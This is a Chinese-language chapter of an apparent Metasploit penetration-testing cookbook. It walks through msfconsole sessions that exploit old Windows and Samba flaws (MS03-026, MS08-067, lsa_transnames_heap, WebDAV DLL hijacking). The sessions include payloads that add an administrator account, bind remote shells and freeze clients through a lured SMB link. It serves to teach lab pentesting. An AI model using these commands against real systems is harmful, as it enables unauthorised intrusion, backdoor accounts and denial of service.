# 第三章。基于操作系统的漏洞评估和利用

在本章中，我们将涵盖：

+   利用程序使用快速提示

+   对 Windows XP SP2 机器进行渗透测试

+   将 shell 绑定到目标以进行远程访问

+   对 Windows 2003 服务器进行渗透测试

+   Windows 7/Server 2008 R2 SMB 客户端无限循环

+   利用 Linux（Ubuntu）机器

+   理解 Windows DLL 注入漏洞

# 介绍

在上一章中，我们专注于收集有关我们目标的信息。各种信息包括目标 IP 地址、开放端口、可用服务、操作系统等等。在信息收集过程中最重要的资产之一是了解目标服务器或系统使用的操作系统。这些信息在渗透目标机器时可能非常有帮助，因为我们可以快速寻找正在使用的操作系统的利用程序和漏洞。嗯，这个过程并不像听起来那么简单，但了解目标操作系统可以在很大程度上简化我们的任务。

每种操作系统都有一些或其他的漏洞。一旦被报告，就开始开发针对它的利用程序的过程。像 Windows 这样的有许可的操作系统很快就会为漏洞或脆弱性开发补丁，并将其作为更新提供给用户。漏洞披露是一个大问题。许多零日漏洞的披露在计算机行业造成了混乱。零日漏洞非常受欢迎，在地下市场上，价格可能从 50K 美元到 100K 美元不等。漏洞被发现和利用，但漏洞的披露取决于研究人员及其意图。

著名的产品如微软和 Adobe 定期发布补丁，但用户需要自行应用这些补丁。在企业场景中，情况甚至更糟糕——由于停机时间和确保业务连续性不受影响，服务器在被打补丁之前需要花费数周的时间。因此，始终建议更新或关注所使用操作系统中发现的任何最新漏洞。未打补丁的系统对黑客来说是一个安全的避风港，因为他们会立即启动利用程序来攻击目标。因此，定期打补丁和更新操作系统至关重要。在本章中，我们将重点关注一些最受欢迎的操作系统中报告的漏洞。

在渗透测试过程中，一旦获得了有关目标操作系统的信息，渗透测试人员就开始寻找特定操作系统漏洞的可用利用程序。因此，本章将是通过操作系统漏洞渗透我们目标的第一步。我们将重点关注微软和一些 Linux 版本中最广泛使用的家庭和企业操作系统。我们还将讨论如何使用利用程序并设置其参数以使其在目标机器上可执行。最后，但同样重要的是，我们将讨论 Metasploit 框架中对我们可用的一些有用的有效载荷。所以让我们开始做菜。

# 利用程序使用快速提示

在开始在目标机器上使用利用程序和有效载荷之前，我们首先必须了解一些关于它们的基础知识。了解利用程序的使用非常重要，这样您就可以克服由于参数错误配置而可能出现的一些常见错误。因此，让我们从利用程序的基础知识和如何设置参数值开始。

## 做好准备

为了开始在目标上使用利用程序，首先需要扫描目标的开放端口和服务。一旦收集到足够的关于目标的信息，下一步就是相应地选择利用程序。因此，让我们分析一些可以直接从 msfconsole 启动的利用命令。

## 如何做...

以下是在利用程序使用过程中将有所帮助的一些命令：

+   `msf > show exploits`和`msf > show payloads:` 这两个命令将显示 Metasploit 目录中所有可用的攻击和有效载荷。

+   `msf > search exploit:` 此命令将搜索特定的攻击。我们也可以使用此命令搜索任何特定的搜索词。命令应以以下方式传递：

`msf > search exploit-name or search-term`

例如，考虑以下命令：

```
    msf > search ms03_026_dcom
    Matching Modules
    ================
    Name Disclosure Date Rank Description
    ---- --------------- ---- -----------
    exploit/windows/
    dcerpc/ms03_026_dcom 2003-07-16 great Microsoft RPC DCOM 
    ```

+   `msf > use exploit:` 此命令用于设置任何攻击为活动状态并准备使用。命令以以下方式传递：

msf > use exploit name

执行此命令后，提示符也会更改为攻击类型：

```
    msf > use exploit/windows/dcerpc/ms03_026_dcom
    msf exploit(ms03_026_dcom) > 
    ```

+   `show options:` 此命令用于查看正在使用的攻击的可用选项或参数。各种参数包括主机 IP、端口、线程等。标记为`yes`的参数必须有一个值才能执行攻击。

```
    msf exploit(ms03_026_dcom) > show options
    Module options (exploit/windows/dcerpc/ms03_026_dcom):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 135 yes The target port 
    ```

+   `set:` 此命令用于在使用的攻击中设置参数的值。它用于为使用的特定攻击设置有效载荷。命令可以以以下方式传递：

`msf > set parameter-name parameter-value`

同样，我们也可以使用`unset`命令：

```
    msf exploit(ms03_026_dcom) > set RHOST 102.168.56.102
    RHOST => 102.168.56.102
    msf exploit(ms03_026_dcom) > 
    ```

+   还有名为`setg`和`unsetg`的可选命令。当我们需要在`msfconsole`中全局设置参数值时，可以使用这些命令。因此，它可以避免我们重新输入相同的值。

+   `show targets:` 每个攻击都是针对特定目标服务的。此命令显示攻击可以使用的可能目标的信息：

```
    msf exploit(ms03_026_dcom) > show targets
    Exploit targets:
    Id Name
    -- ----
    0 Windows NT SP3-6a/2000/XP/2003 Universal 
    ```

在这里，我们可以看到`dcom`攻击适用于多种 Windows 机器。

## 它是如何工作的...

在第一章中，*安全专业人员的 Metasploit 快速提示*，我们已经讨论了整个 Metasploit 框架具有模块化架构。不同的攻击被转换为框架可理解的模块，可以根据其功能。调用不同的命令来加载和设置模块。`msfconsole`的命令行界面使得访问不同的模块和执行渗透测试变得容易。

# 在 Windows XP SP2 机器上进行渗透测试

现在让我们开始使用攻击的世界。首先，我们将使用最基本但最广泛使用的操作系统 Windows XP。在这个示例中，我们将看到如何使用 Metasploit 来入侵我们正在运行 Windows XP 机器的目标系统。我们将使用在上一个示例中学到的命令，然后继续选择攻击和有效载荷，并设置各种所需的参数。

## 准备工作

我们将从`msfconsole`开始我们的渗透测试过程。因此，启动控制台并执行端口扫描以收集有关目标的信息。我们在上一章节中详细讨论了端口扫描。在这里，我假设您已经收集了有关目标的信息，并且它正在运行 Windows XP 操作系统。因此，让我们继续选择攻击和有效载荷。

## 如何做...

要在 Windows XP SP2 机器上执行渗透测试，请按照以下步骤进行：

1.  主要目标是选择一个可以在 Windows XP 机器上使用的攻击。您可以浏览`/exploits/windows`目录，或者简单地搜索 Windows XP 平台上可用攻击的列表。我们将使用 RPC `dcom`漏洞来渗透我们的目标。因此，让我们首先搜索 RPC `dcom`漏洞，使用以下命令：

```
    msf exploit(ms03_026_dcom) > search dcom
    Matching Modules
    ================
    Name Disclosure Date Rank Description
    ---- --------------- --- -----------
    exploit/windows
    dcerpc/ms03_026_dcom 2003-07-16 great Microsoft RPC
    xploit/windows/
    driver/
    broadcom_wifi_ssid 2006-11-11 low Broadcom Wireless
    xploit/windows/
    smb/ms04_031_netdde 2004-10-12 good Microsoft NetDDE 
    ```

如我们所见，搜索产生了三个结果。我们将使用第一个攻击，因为它的`rank`列为`great`，因此成功率会更高。

1.  为了将`exploit/windows/dcerpc/ms03_026_dcom`设置为可用的攻击，我们将执行以下命令：

```
    msf exploit(ms03_026_dcom) > use exploit/windows/dcerpc/ms03_026_dcom
    msf exploit(ms03_026_dcom) > 
    ```

提示符的更改表示命令已成功执行。

1.  下一步将是设置 exploit 的各种参数。`show options`命令将列出 exploit 中可用的参数。然后，通过使用`set`命令，我们可以设置各种参数。某些参数也将具有默认值：

```
    msf exploit(ms03_026_dcom) > show options
    Module options (exploit/windows/dcerpc/ms03_026_dcom):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 135 yes The target port
    Exploit target:
    Id Name
    -- ----
    0 Windows NT SP3-6a/2000/XP/2003 Universal 
    ```

这里，`RHOST`表示远程主机的 IP 地址，`RPORT`表示默认绑定端口。`RPORT`的值默认设置为`135`。我们将不得不将`RHOST`的值设置为我们的目标 IP 地址，以执行 exploit：

```
    msf exploit(ms03_026_dcom) > set RHOST 192.168.56.102
    RHOST => 192.168.56.102
    msf exploit(ms03_026_dcom) > 
    ```

### 注意

请注意，`ms03_026_dcom` exploit 的 ID 设置为`0`。这意味着我们不需要指定目标上运行的 Windows 机器。它可以利用其中列出的任何 Windows 机器。对于任何其他 exploit，我们可能需要使用`show targets`命令选择目标操作系统。

现在，`RHOST`的值已设置为我们的目标 IP 地址。如果我们尝试运行 exploit，我们将收到错误消息。原因是我们尚未为 exploit 选择任何有效载荷。

1.  我们的下一步将是选择相关的有效载荷。我们可以使用`show payloads`命令列出所有可用的有效载荷。我们将从`windows/adduser`有效载荷的简单示例开始。此有效载荷将在目标操作系统中添加一个新用户：

```
    msf exploit(ms03_026_dcom) > set PAYLOAD windows/adduser
    PAYLOAD => windows/adduser 
    ```

1.  现在，如果我们再次使用`show options`命令，它将列出 exploit 和 payload 的参数。有效载荷参数将如下所示：

```
    Payload options (windows/adduser):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    EXITFUNC thread yes seh, thread, process, none
    PASS metasploit yes password for this user
    USER metasploit yes The username to create 
    ```

我们可以看到将添加到我们的目标操作系统的默认用户名和密码是`metasploit`和`metasploit`。我们可以使用`set PASS`和`set USER`命令更改这些值。

1.  现在我们的有效载荷已设置好，我们准备渗透目标机器。我们将使用以下命令启动 exploit：

```
    msf exploit(ms03_026_dcom) > exploit
    [*] Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
    [*] Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.56.102[135] ...
    [*] Bound to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.56.102[135] ...
    [*] Sending exploit ...
    [*] Exploit completed, but no session was created. 
    ```

输出的最后一行显示 exploit 已成功完成在目标机器上。现在将在目标机器中添加一个新用户。输出还表示未创建任何会话。这是因为我们使用的有效载荷是一个简单的`adduser`，不需要任何活动会话。因此，一旦 exploit 完成，与目标的连接就会结束。在下一个步骤中，我们将使用有效载荷设置会话。

## 工作原理...

RPC 的一部分存在漏洞，该漏洞涉及通过 TCP/IP 进行消息交换。失败是因为对畸形消息的处理不正确。这种特定的漏洞影响具有 RPC 的**分布式组件对象模型（DCOM）**接口，该接口监听 RPC 启用的端口。因此，目标机器必须具有运行 RPC 服务的可用端口。

此接口处理由客户机发送到服务器的 DCOM 对象激活请求。成功利用此漏洞的攻击者将能够以受影响系统上的本地系统特权运行代码。攻击者将能够在系统上执行任何操作。这包括安装程序、查看/更改/删除数据或创建具有完全特权的新帐户。

有关此漏洞的更多详细信息，您可以访问以下链接到 Microsoft 安全公告：

[`technet.microsoft.com/en-us/security/bulletin/ms03-026`](http://technet.microsoft.com/en-us/security/bulletin/ms03-026)

现在，为了了解`adduser`有效载荷的工作原理，我们将分析有效载荷的 ruby 代码。让我们浏览到有效载荷位置：

```
root@bt:~# cd /pentest/exploits/framework3/modules/payloads/singles/windows
root@bt:/pentest/exploits/framework3/modules/payloads/singles/windows# less adduser.rb 
```

我们感兴趣的代码部分如下：

```
# Register command execution options
register_options(
[
OptString.new('USER', [ true, "The username to create", "metasploit" ]),
OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
], self.class)
# Hide the CMD option
deregister_options('CMD')
end
#
# Override the exec command string
#
def command_string
user = datastore['USER'] || 'metasploit'
pass = datastore['PASS'] || ''
if(pass.length > 14)
raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
end
return "cmd.exe /c net user #{user} #{pass} /ADD && " +
"net localgroup Administrators #{user} /ADD"
end

```

通过添加`#`符号的注释，您可以理解代码。代码简单且自解释。首先注册用户名和密码的值。然后，它继续隐藏`CMD`函数，以防止在目标屏幕上出现，同时执行有效载荷。然后，代码覆盖`windows/exec`有效载荷以传递参数值并启动一个隐秘的命令提示符在后台执行。

你可以玩弄代码并进行自己的更改。这将帮助你深入了解有效载荷的世界。

# 将一个 shell 绑定到目标以进行远程访问

在上一篇文章中，我们分析了如何利用 Windows SP2 机器并添加一个新用户账户。但是在执行利用后连接立即终止。在这篇文章中，我们将向前迈进一步，将一个 shell 绑定到目标上，以便我们可以建立远程连接并控制目标。这个过程与上一篇文章中提到的类似。我们所要做的就是使用一个不同的有效载荷，可以在目标机器上为我们启动一个 shell。

## 准备工作

我们将再次启动我们的`msfconsole`，我们的目标与*在 Windows XP SP2 机器上进行渗透测试*配方中相同。我们将使用相同的`dcom`漏洞，然后这次使用不同的有效载荷将一个 shell 绑定到目标。

## 如何做...

要将一个 shell 绑定到目标，按照以下步骤进行：

1.  我们将从选择`dcom`利用开始针对我们的目标机器。我们将设置各种利用参数，然后选择有效载荷：

```
    msf > use exploit/windows/dcerpc/ms03_026_dcom
    msf exploit(ms03_026_dcom) > show options
    Module options (exploit/windows/dcerpc/ms03_026_dcom):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 135 yes The target port
    Exploit target:
    Id Name
    -- ----
    0 Windows NT SP3-6a/2000/XP/2003 Universal
    msf exploit(ms03_026_dcom) > set RHOST 192.168.56.102
    RHOST => 192.168.56.102 
    ```

1.  现在我们的利用已经设置好，我们现在将转向有效载荷。使用`show payloads`命令将列出所有可用的有效载荷。现在，我们将使用`windows/shell/bind_tcp`有效载荷，它将在目标机器上的端口`4444`（默认）上打开一个 TCP 连接，并为我们提供一个命令 shell：

```
    msf exploit(ms03_026_dcom) > set PAYLOAD windows/shell/bind_tcp
    PAYLOAD => windows/shell/bind_tcp 
    ```

1.  现在：使用`show options`命令，我们可以设置其他相关参数，如`RHOST`并更改默认端口。设置好参数后，我们将执行利用。让我们看看执行的输出是什么：

```
    msf exploit(ms03_026_dcom) > exploit
    [*] Started reverse handler on 192.168.56.101:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP - Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (AlwaysOn NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.56.102
    [*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:1052) at 2011-10-31 01:55:42 +0530
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.
    C:\WINDOWS\system32> 
    ```

利用已经成功执行，并且我们在`msfconsole`中启动了一个命令提示符。现在，这个会话可以用来完全远程访问目标机器。我们可以随时使用`exit`命令退出这个会话。

你现在可能已经意识到了 Metasploit 中有效载荷的强大。强烈建议尝试各种可用的有效载荷，以了解它们的功能。

## 它是如何工作的...

`dcom`利用的工作原理与上一篇文章中解释的相同。要了解`bind_tcp`的工作原理，我们需要等一会儿，因为它涉及到一些我们将在本书的后面章节中处理的概念。不过，你可以通过浏览`/pentest/exploits/framework3/modules/payloads/stagers/windows/bind_tcp.rb`来查看有效载荷 ruby 代码。

## 还有更多...

接下来呢？shell 访问如何为我们提供对目标的控制。

### 获得对目标的完全控制

现在我们已经在目标机器上建立了一个 shell 连接，我们可以通过命令提示符完全访问目标机器。现在我们可以继续使用我们可以使用的常见 DOS 命令来探索目标机器。一些基本操作包括目录列表、复制文件和文件夹、创建用户代理等。

# 对 Windows 2003 服务器进行渗透测试

在上一篇文章中，我们分析了如何使用`dcom`利用来引起缓冲区溢出并利用我们的 Windows 目标。在这篇文章中，我们将专注于一个类似但逻辑上不同的环境。Windows 2003 服务器是微软最广泛使用的企业级操作系统之一。在这篇文章中，我们将看到如何利用 Windows 2003 服务器。更新版本的 Windows 2003 服务器已经修补了`dcom`漏洞，所以在这里不起作用。因此，我们将在这篇文章中尝试不同的漏洞。我们将使用`netapi32.dll`漏洞。首先，我们将分析利用过程，然后分析这个漏洞的原因。让我们开始我们的渗透测试。

## 准备工作

首先，让我们启动`msfconsole`并快速扫描目标。建议您按顺序执行所有步骤，以确保加强基础知识。下一步将与我们在前两个示例中讨论的相同。唯一的区别在于使用利用。

## 如何做...

要对 Windows 2003 服务器进行渗透测试，请按照以下步骤进行：

1.  让我们开始搜索`netapi`。这将列出 Metasploit 目录中与`netapi`相关的任何可用利用：

```
    msf > search netapi
    Matching Modules
    ================
    Name Disclosure Date Rank
    ---- --------------- ---- exploit/windows/smb/ms03_049_netapi 2003-11-11 good
    exploit/windows/smb/ms06_040_netapi 2006-08-08 good
    exploit/windows/smb/ms06_070_wkssvc 2006-11-14 manual
    exploit/windows/smb/ms08_067_netapi 2008-10-28 great 
    ```

正如我们所看到的，四个结果中，最后一个利用具有很高的评分。所以我们将优先使用这个利用。

1.  我们将设置`RHOST`作为我们的目标 Windows 2003 服务器：

```
    msf > use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > show options
    Module options (exploit/windows/smb/ms08_067_netapi):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 445 yes Set the SMB service port
    SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
    Exploit target:
    Id Name
    -- ----
    0 Automatic Targeting
    msf exploit(ms08_067_netapi) > set RHOST 192.168.56.102
    RHOST => 192.168.56.102 
    ```

再次，`Id`值`0`表明我们不需要指定目标操作系统。

1.  一旦我们完成了利用加载过程，下一步将是设置有效载荷。我们将在目标机器上再次设置一个`tcp_bind` shell，就像我们之前讨论的那样。

```
    msf exploit(ms08_067_netapi) > set payload
    windows/shell/bind_tcp
    payload => windows/shell/bind_tcp
    msf exploit(ms08_067_netapi) > set LHOST 192.168.56.101
    LHOST => 192.168.56.101 
    ```

所以现在，我们的利用和有效载荷已经准备好了。下一步也是最后一步是使用`exploit`命令。让我们分析执行的结果：

```
    msf exploit(ms08_067_netapi) > exploit
    [*] Started bind handler
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows 2003 SERVER - Service Pack 2 - lang:English
    [*] Selected Target: Windows 2003 Server SP2 English (AlwaysOn NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.56.102
    [*] Command shell session 1 opened (192.168.56.101:43408 -> 192.168.56.102:4444) at 2011-11-02 21:25:30 +0530
    C:\WINDOWS\system32> 
    ```

太棒了！我们与目标建立了 shell 连接。这使我们可以通过命令行访问目标机器。您可以看到 Metasploit 在渗透目标机器方面有多么强大。这确实极大地简化了我们的任务。让我们快速看一下我们在这个示例中使用的利用。

## 工作原理...

该模块利用了`netapi32.dll`路径规范化代码中的解析漏洞，通过服务器服务。该模块能够绕过一些操作系统和服务包上的 NX。必须使用正确的目标来防止服务器服务（以及同一进程中的其他几个服务）崩溃。

# Windows 7/Server 2008 R2 SMB 客户端无限循环

对于 Windows 7 和 Windows Server 2008，可用的利用非常少。SMB 客户端无限循环是一种会导致系统崩溃的漏洞。这种漏洞不会提供任何会话或 shell 连接，但值得讨论。我们将在*理解 Windows DLL 注入漏洞*示例中讨论 Windows 7 中的 DLL 注入漏洞。

Microsoft Windows Server 2008 R2 和 Windows 7 中的 SMB 客户端允许远程 SMB 服务器和中间人攻击者通过 SMBv1 或 SMBv2 响应数据包导致拒绝服务（无限循环和系统挂起）。数据包包含 NetBIOS 标头中的不正确长度值或此响应数据包末尾的附加长度字段。这个不正确的标头值是漏洞的主要原因。

## 准备工作

Metasploit 包含一个辅助模块`auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop`，可以用来利用 SMB 服务器并导致拒绝服务。攻击向量通过将 UNC 路径传递到网页并要求用户执行它来工作。一旦用户打开共享文件，系统将完全崩溃，目标将被迫重新启动。

## 如何做...

要开始使用这个辅助模块，我们必须执行`use`命令以及模块的路径。然后，我们将继续设置所需的参数并执行模块。让我们继续实际实施这些步骤：

```
msf > use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop
msf auxiliary(ms10_006_negotiate_response_loop) > show options
Module options (auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop):
Name Current Setting Required Description
---- --------------- -------- -----------
SRVHOST 0.0.0.0 yes The local host..
SRVPORT 445 yes The SMB port to listen
SSL false no Negotiate SSL..
SSLCert no Path to a custom SSL
SSLVersion SSL3 no Specify the version.. 
```

让我们快速设置各种参数。唯一要查找的参数是`SRVHOST`，即本地主机 IP 地址或渗透测试者的 IP 地址。

```
msf auxiliary(ms10_006_negotiate_response_loop) > set SRVHOST 192.168.56.101
SRVHOST => 192.168.56.101 
```

## 工作原理...

我们将使用`run`命令来执行辅助模块。一旦模块执行，它将生成一个共享文件夹链接，必须发送给目标。在这种情况下，生成的链接是`\\192.168.56.101\Shared\Anything`。

```
msf auxiliary(ms10_006_negotiate_response_loop) > run
[*] Starting the malicious SMB service...
[*] To trigger, the vulnerable client should try to access: \\192.168.56.101\Shared\Anything
[*] Server started. 
```

现在我们可以通过制作一个网页并将该链接附加到网页上，然后发送给目标用户，使链接看起来不那么可疑。一旦目标点击该链接，系统将完全冻结，并导致完全的拒绝服务，从而导致系统重新启动。

# 利用 Linux（Ubuntu）机器

Linux 是继 Windows 之后使用最广泛的操作系统之一。在之前的几个示例中，我们看到了如何通过利用可用服务中的关键缺陷来渗透 Windows 机器。在本示例中，我们将处理 Linux 操作系统。我们将在本示例中使用 Ubuntu 9.0，但是对于渗透运行 Samba 服务的任何 Linux 和 Solaris 版本，该过程都是类似的。让我们继续进行本示例。

## 准备工作

我们将从扫描目标 Linux 机器开始，以收集有关可用服务的信息。让我们进行快速的 Nmap 扫描并分析其结果：

```
msf > nmap -sT 192.168.56.101
[*] exec: nmap 192.168.56.101
Starting Nmap 5.20 ( http://nmap.org ) at 2011-11-05 13:35 IST
Warning: Traceroute does not support idle or connect scan, disabling...
Nmap scan report for 192.168.56.101
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.2.3 ((Ubuntu) PHP/5.2.1)
|_html-title: Index of /
139/tcp open netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
445/tcp open netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ) 
```

现在我们已经收集了有关目标的信息。我们的下一步将是选择一个利用和一个适当的有效载荷。

## 如何做...

渗透 Linux 机器的过程与 Windows 的类似。按照以下步骤进行：

1.  我们需要关注的是选择正确的利用和有效载荷。让我们搜索一下 Metasploit 目录中是否有任何 Samba 利用可用：

```
    msf > search Samba 
    ```

1.  该命令将提供 Samba 的各种辅助和利用模块的列表。我们将使用列为良好排名利用的`exploit/linux/samba/lsa_transnames_heap`模块。因此，它将更有可能利用目标。让我们将利用设置为活动状态并设置参数。

```
    msf > use exploit/linux/samba/lsa_transnames_heap
    msf exploit(lsa_transnames_heap) > show options
    Module options (exploit/linux/samba/lsa_transnames_heap):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 445 yes Set the SMB service port
    SMBPIPE LSARPC yes The pipe name to use
    Exploit target:
    Id Name
    -- ----
    0 Linux vsyscall
    msf exploit(lsa_transnames_heap) > set RHOST 192.168.56.101
    RHOST => 192.168.56.101
    msf exploit(lsa_transnames_heap) > 
    ```

1.  我们的下一个任务是选择有效载荷。我们必须记住一件事，即我们正在针对 Linux 机器，因此我们必须为渗透过程选择一个 Linux 有效载荷。我们将使用`linux/x86/shell_bind_tcp`有效载荷，它与我们在之前的 Windows 示例中分析的`bind_tcp`有效载荷类似。

```
    msf exploit(lsa_transnames_heap) > set payload linux/x86/shell_bind_tcp
    payload => linux/x86/shell_bind_tcp
    msf exploit(lsa_transnames_heap) > show options
    Module options (exploit/linux/samba/lsa_transnames_heap):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST 192.168.56.101 yes The target address
    RPORT 445 yes Set the SMB service port
    SMBPIPE LSARPC yes The pipe name to use
    Payload options (linux/x86/shell_bind_tcp):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    LPORT 4444 yes The listen port
    RHOST 192.168.56.101 no The target address 
    ```

1.  我们现在已经准备好了，我们的最后一步将是提供利用命令来开始利用过程：

```
    msf exploit(lsa_transnames_heap) > exploit
    [*] Started bind handler
    [*] Creating nop sled....
    [*] Trying to exploit Samba with address 0xffffe410...
    [*] Connecting to the SMB service... 
    ```

成功执行利用后，我们将获得与目标机器的 shell 连接。该过程与我们在之前的示例中讨论的非常相似。唯一的区别在于选择利用和有效载荷。尝试不同的利用和有效载荷组合，将更好地帮助您理解它。

## 它是如何工作的...

让我们快速了解一下服务、其利用和工作的相关内容。Samba 用于 Linux 和 Windows 机器之间的打印和文件共享。该模块触发了 Samba 守护程序的 LSA RPC 服务中的堆溢出。该模块使用了 talloc 块覆盖方法（由 Ramon 和 Adriano 提供），该方法仅适用于 Samba 版本 3.0.21-3.0.24。该利用利用了堆中的动态内存分配。利用可能在第一次尝试时不成功，因此您可以尝试多次以实现成功。

## 还有更多...

让我们再来看一些与 Linux 操作系统相关的更多相关模块。

### Linux 的其他相关利用模块

除了本示例中讨论的利用模块外，还有两个模块值得关注。强烈建议您手动尝试这些利用以深入了解它们。它们是：

+   **Samba chain_reply 内存损坏：**该利用通过破坏 Samba 版本 3.3.13 之前分配给响应数据包的内存来工作。内存通过传递大于目标缓冲区大小的值而崩溃。

+   **Samba trans2open 溢出：**这是 Samba 版本 2.2.0 至 2.2.8 存在的缓冲区溢出漏洞。它通过利用在未设置`noexec`堆栈选项的 x86 Linux 机器上的缺陷来工作。

# 了解 Windows DLL 注入漏洞

在这个示例中，我们将处理一种特殊类型的漏洞，这种漏洞并不直接存在于 Windows 操作系统中。事实上，它存在于运行在 Windows 上的各种应用软件中。这种远程攻击向量涉及影响应用程序如何加载外部库的一类漏洞。我们将对这个问题进行概述，以便进行仔细分析。

## 准备工作

这种攻击向量涉及创建一个脆弱的路径或目录，目标将不得不执行以触发它。该目录可以是文件、提取的存档、USB 驱动器、网络共享等。创建的文件将是完全无害的，但它将执行一个 DLL 注入代码来破坏系统。

## 如何操作...

让我们分析一下 DLL 注入的实际实现。在这个例子中，我们的目标机器是一个未打补丁的 Windows 7 Ultimate 机器。该过程通过创建一个链接来共享文件，目标将不得不访问并执行该文件。随着我们的进展，你将理解这个过程。

1.  我们将使用`exploit/windows/browser/webdav_dll_hijacker`模块作为利用，`windows/meterpreter/bind_tcp`作为有效载荷。让我们快速设置利用和有效载荷以及其他所需的参数：

```
    msf > use exploit/windows/browser/webdav_dll_hijacker
    msf exploit(webdav_dll_hijacker) > set payload windows/meterpreter/bind_tcp
    payload => windows/meterpreter/bind_tcp
    msf exploit(webdav_dll_hijacker) > show options
    Module options (exploit/windows/browser/webdav_dll_hijacker):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    BASENAME policy yes The base name for the listed
    EXTENSIONS txt yes The list of extensions
    SHARENAME documents yes The name of the top-level
    SRVHOST 0.0.0.0 yes The local host...
    SRVPORT 80 yes The daemon port to listen
    SSLCert no Path to a custom SSL..
    URIPATH / yes The URI to use
    Payload options (windows/meterpreter/bind_tcp):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    EXITFUNC process yes Exit technique: seh..
    LPORT 4444 yes The listen port
    RHOST 192.168.56.102 no The target address
    Exploit target:
    Id Name
    -- ----
    0 Automatic 
    ```

利用的各种参数将有助于创建特定文件和顶层共享。`BASENAME`参数包含要创建的文件的名称。`EXTENSIONS`是要创建的文件类型。`SHARENAME`是将为访问而创建的顶级共享目录。`SRVHOST`是本地监听端口，`SRVPORT`是`SRVHOST`将在其上监听连接的端口号。

1.  一旦设置了利用和有效载荷的各个参数，下一步就是执行利用。让我们看看当我们执行它时会发生什么：

```
    msf exploit(webdav_dll_hijacker) > exploit
    [*] Exploit running as background job.
    [*] Started bind handler
    [*]
    [*] Exploit links are now available at
    \\192.168.56.101\documents\ 
    ```

1.  一旦利用成功执行，它就开始监听连接，并提供一个共享链接，目标将不得不打开该链接以触发利用。让我们切换到目标屏幕看看会发生什么：![如何操作...](img/7423_03_01.jpg)

目标将查看一个简单的文件`policy.txt`，这个文件是攻击者共享的。这个文件是完全无害的。一旦用户执行了这个文件，就会与攻击者的机器建立连接，并建立 shell 连接。一旦文件在目标上执行，DLL 将执行，你将在你的`msfconsole`屏幕上看到大量的活动。一旦 DLL 注入成功，我们将有 shell 连接（见下图）：

![如何操作...](img/7423_03_02.jpg)

## 它是如何工作的...

让我们挖掘一下这个漏洞的原因。**动态链接库(DLL)**是微软在 Windows 上实现的共享库概念。DLL 是在运行时与程序相关联的可执行文件，用于加载与其链接的共享库。当应用程序运行时，`loadlibrary()`函数在运行时加载所需的 DLL。如果未指定要加载的 DLL 的位置，或者应用程序提供了不够合格的库路径，Windows 将使用其自己定义的顺序来搜索它。在这个默认顺序中的一个位置是当前工作目录。

现在，当目标用户访问共享位置时，它会到达一个受攻击者控制的区域。如何做到的呢？共享文件（`policy.txt`）包含了一个较低限定路径的 DLL，因此当目标用户执行它时，Windows 会开始搜索缺失的 DLL。现在，由于当前工作目录（`/documents`）受攻击者控制，他/她可以在其中添加一个恶意 DLL 代码，Windows 将执行它（因为当前工作目录是 Windows 寻找库文件的默认位置之一）。现在这个恶意 DLL 可以赋予攻击者执行外部脚本的权限。因此，有效载荷现在开始生效，并建立一个 shell 连接，为攻击者提供对目标系统的完全访问权限。这就是整个攻击向量是如何设计的。

## 还有更多...

我们可以使用 H. D. Moore 开发的一个简单工具来寻找 DLL 注入。让我们快速了解一下。

### H. D. Moore 的 DllHijackAudit 工具

Metasploit 的创始人 H. D. Moore 创建了这个安全审计工具，它可以用于在您自己的环境中测试 DLL 注入漏洞。它利用了进程监控实用程序和 Ruby 解释器。它通过监视相关文件的工作目录中是否访问了 DLL 来工作。它还生成测试报告。该工具和详细文档可以在[`blog.metasploit.com/2010/08/better-faster-stronger.html`](http://blog.metasploit.com/2010/08/better-faster-stronger.html)找到。
